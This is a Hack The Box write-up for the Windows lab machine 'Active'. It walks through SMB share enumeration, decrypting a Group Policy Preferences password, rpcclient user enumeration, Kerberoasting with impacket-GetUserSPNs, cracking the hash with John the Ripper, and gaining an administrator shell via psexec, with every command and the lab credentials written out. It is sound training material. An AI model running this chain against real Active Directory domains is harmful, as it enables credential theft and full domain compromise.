# Active

## General information

<h3> Difficulty: <img src="https://img.shields.io/badge/Facil-Green"> </h3>

<h3> Operating system: Windows</h3>

<h3> Exploited vulnerability: SMB Enumeration, Abusing GPP Passwords, Decrypting GPP Passwords - gpp-decrypt, Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation] </h3>

<h3> Date: 11/11/2025</h3>

<h3> Link: <a href="https://app.hackthebox.com/machines/148/information" target="_blank">Active</a></h3>

### *Read this document in spanish* <a href="active.md">active</a>

## Recognition

HTB provides us with the target machine's IP address: **10.129.65.245**. Our IP address is: **10.10.14.110**.

I will add the target VM's IP address to the **/etc/hosts** file and name it **active.htb**.

### Ping

Depending on the result, we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 10.129.65.245
```

Its TTL is 128. Therefore, it's Windows.

### Open port scan

#### TCP port scan

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn active
```

<p align="center"> 
<img src="images/Pasted image 20251106154500.png" width="600" alt="Resultado de Nmap">
</p>

<p align="center"> 
<img src="images/Pasted image 20251106155234.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service      | Version                                                                                     |
| --------- | ------------ | ------------------------------------------------------------------------------------------- |
| 53        | domain       | Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)                              |
| 88        | kerberos-sec | Microsoft Windows Kerberos (server time: 2025-11-06 14:34:37Z)                              |
| 135       | msrpc        | Microsoft Windows RPC                                                                       |
| 139       | netbios-ssn  | syn-ack ttl 127 Microsoft Windows netbios-ssn                                               |
| 389       | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) |
| 445       | microsoft-ds | -                                                                                           |
| 464       | tcpwrapped   | -                                                                                           |
| 593       | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                         |
| 636       | tcpwrapped   | -                                                                                           |
| 3268      | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) |
| 3269      | tcpwrapped   |                                                                                             |
| 5722      | msrpc        | Microsoft Windows RPC                                                                       |
| 9389      | mc-nmf       | .NET Message Framing                                                                        |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                     |
| 49152/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49153/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49154/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49155/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49157/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.                                                          |
| 49158/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49162/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49166/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49168/tcp | msrpc        | Microsoft Windows RPC                                                                       |

</div>

## Exploration

Port 53 is the DNS protocol. This means there's an Active Directory on this machine.

We have the Samba protocol open on ports 139 and 445. We'll use the crackmapexec tool to find out what we're dealing with.

```
crackmapexec smb active
```

**SMB         active          445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)**

We are dealing with a Windows 7 x64 machine. Both **nmap** and **crackmapexec** report the presence of a domain called **active.htb**.

I can then use a tool like **smbmap** to determine if any files are being shared with us and to check their permissions.

```
smbmap -H 10.129.65.245
```

<p align="center"> 
<img src="images/Pasted image 20251106162655.png" width="600" alt="Resultado de Nmap">
</p>

We found out what's in **Replication**

```
smbmap -H 10.129.65.245 -r Replication
```

<p align="center"> 
<img src="images/Pasted image 20251106163132.png" width="600" alt="Resultado de Nmap">
</p>

I would like to know what's inside **active.htb**, therefore:

```
smbmap -H 10.129.65.245 -r Replication/active.htb
```

<p align="center"> 
<img src="images/Pasted image 20251106163333.png" width="600" alt="Resultado de Nmap">
</p>

This has a **SYSVOL** style structure. The idea now is to find a file called **groups.xml**.

```
smbmap -H 10.129.65.245 -r Replication/active.htb/Policies
```

<p align="center"> 
<img src="images/Pasted image 20251106163634.png" width="600" alt="Resultado de Nmap">
</p>

We have found **Guid**, which is basically the identifier of a Group Policy Object, and this is found in a SYSVOL file.

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
```

<p align="center"> 
<img src="images/Pasted image 20251110105222.png" width="600" alt="Resultado de Nmap">
</p>

Now the idea is to continue enumerating until we find a file called groups.xml

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/
```

<p align="center"> 
<img src="images/Pasted image 20251110110809.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/
```

<p align="center"> 
<img src="images/Pasted image 20251110110857.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
```

<p align="center"> 
<img src="images/Pasted image 20251110111129.png" width="600" alt="Resultado de Nmap">
</p>

Once we have found the **Groups.xml** file, we download it.

```
smbmap -H 10.129.60.254 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml/
```

<p align="center"> 
<img src="images/Pasted image 20251110111613.png" width="600" alt="Resultado de Nmap">
</p>

```
xmllint --format groups.xml | batcat --language=xml
```

<p align="center"> 
<img src="images/Pasted image 20251110113133.png" width="600" alt="Resultado de Nmap">
</p>

We use this command to make the groups.xml file look nicer.

**userName** --> active.htb\SVC_TGS
**cpassword** --> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

But the cpassword needs to be converted to plain text, so we'll use the tool **gpp-decrypt**

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Result: GPPstillStandingStrong2k18

One of the functions of the **crackmapexec** tool is to validate Active Directory users. If the **+** symbol appears, it means the user exists, as is the case here.

```
crackmapexec smb 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

<p align="center"> 
<img src="images/Pasted image 20251110121536.png" width="600" alt="Resultado de Nmap">
</p>

Next, we'll see what we find in this authenticated user:

```
crackmapexec smb 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

<p align="center"> 
<img src="images/Pasted image 20251110122242.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

<p align="center"> 
<img src="images/Pasted image 20251110123102.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS
```

<p align="center"> 
<img src="images/Pasted image 20251110123903.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop
```

<p align="center"> 
<img src="images/Pasted image 20251110123943.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
```

This command downloads the **user.txt** file

<p align="center"> 
<img src="images/Pasted image 20251110124108.png" width="600" alt="Resultado de Nmap">
</p>

```
cat 10.129.60.254-Users_SVC_TGS_Desktop_user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251110124212.png" width="600" alt="Resultado de Nmap">
</p>

Next, we will use the **rpcclient** tool for enumeration of users, groups, and system information.

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'enumdomusers'
```

<p align="center"> 
<img src="images/Pasted image 20251110142540.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'enumdomgroups'
```

<p align="center"> 
<img src="images/Pasted image 20251110151546.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'querydominfo'
```

<p align="center"> 
<img src="images/Pasted image 20251110142728.png" width="600" alt="Resultado de Nmap">
</p>

Now that we're at this point, I'd like to know which users are in the **Domain Admins** group. To do this, we use the following command:

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'querygroupmem 0x200'
```

<p align="center"> 
<img src="images/Pasted image 20251110151622.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'queryuser 0x1f4'
```

<p align="center"> 
<img src="images/Pasted image 20251110151754.png" width="600" alt="Resultado de Nmap">
</p>

Therefore, the user in the **Domain Admins** group is **Administrator**.

To use the following tool, you need to update your Kali system.

```
sudo apt update
sudo apt install impacket-scripts python3-impacket
dpkg -L impacket-scripts | grep -i -E 'GetNP|NPUsers|getnp|npusers' || true
```

This tool called **GetNPUsers.py**, when installed for the first time, appears under the name **impacket-GetNPUsers**

<p align="center"> 
<img src="images/Pasted image 20251110155310.png" width="600" alt="Resultado de Nmap">
</p>

The goal with this tool is to try to obtain the password hash for the **Administrator** user, but it won't work :(

```
impacket-GetNPUsers active.htb/ -no-pas -usersfile user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251110155443.png" width="600" alt="Resultado de Nmap">
</p>

The user Administrator account does not have UF_DONT_REQUIRE_PREAUTH set. This account requires pre-authentication and is therefore not vulnerable to AS-REP roasting (there is no hash to crack).

We will use another tool called GetUserSPNs to find the hash of the Administrator user.

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

<p align="center"> 
<img src="images/Pasted image 20251111002310.png" width="600" alt="Resultado de Nmap">
</p>

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

<p align="center"> 
<img src="images/Pasted image 20251111002416.png" width="600" alt="Resultado de Nmap">
</p>

Once the hash of the **Administrator** user is obtained, the **johntheripper** tool would be used.

```
john -w:$(locate rockyou.txt) hash.txt
```

<p align="center"> 
<img src="images/Pasted image 20251111002906.png" width="600" alt="Resultado de Nmap">
</p>

Therefore, we have:

user: Administrator <br>
pass: Ticketmaster1968

We used the **crackmapexec** tool to validate this account

```
crackmapexec smb 10.129.60.254 -u 'Administrator' -p 'Ticketmaster1968'
```

<p align="center"> 
<img src="images/Pasted image 20251111003345.png" width="600" alt="Resultado de Nmap">
</p>

The plus signs appear and **Pwn3d!** also appears, meaning it's the superuser of the domain.

We access it using the **psexec** tool with the goal of obtaining an interactive shell

```
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.60.254
```

<p align="center"> 
<img src="images/Pasted image 20251111004541.png" width="600" alt="Resultado de Nmap">
</p>

Once inside we obtain the Administrator user flag

```
type C:\Users\Administrator\Desktop\root.txt
```

<p align="center"> 
<img src="images/Pasted image 20251111004923.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

I highly recommend the **active** machine from **HTB** if you're starting out with **Active Directory (AD)**.

I began by investigating the Samba service using **smbmap**, where I found the **Groups.xml** file. This file contained the user **SVC_TGS** with an encrypted password; I converted it to plain text using **gpp-decrypt**. I confirmed the Active Directory domain (**active.htb**) with **crackmapexec**. Remember that the machine's IP address must be listed in **/etc/hosts** with the domain name.

Next, I manually enumerated resources again using **smbmap** with the credentials I obtained earlier, which allowed me to find the first flag. Using **rpcclient**, I enumerated users and groups, and the **Domain Admins** group caught my attention. I also identified the **Administrator** user using **rpcclient**. To obtain the administrator password, I used **GetUserSPNs**, which returned the service hash, and I decrypted it with **John the Ripper**. Finally, with the superuser and password, I used **psexec** to obtain an interactive shell and thus retrieve the root/Administrator user's flag.